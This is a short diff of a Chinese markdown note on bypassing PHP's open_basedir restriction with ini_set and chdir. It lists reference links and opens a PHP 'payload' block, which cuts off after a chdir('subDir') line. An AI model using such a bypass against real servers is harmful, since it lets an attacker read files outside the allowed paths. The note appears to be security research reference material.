@@ -1,8 +1,12 @@
-参考：
+# 利用ini_set和chidr绕过open_basedir
+
+#### 参考
+
 - twitter
 - https://xz.aliyun.com/t/4720
 
-payload
+#### payload
+
 ```python
 <?php
 chdir('subDir');
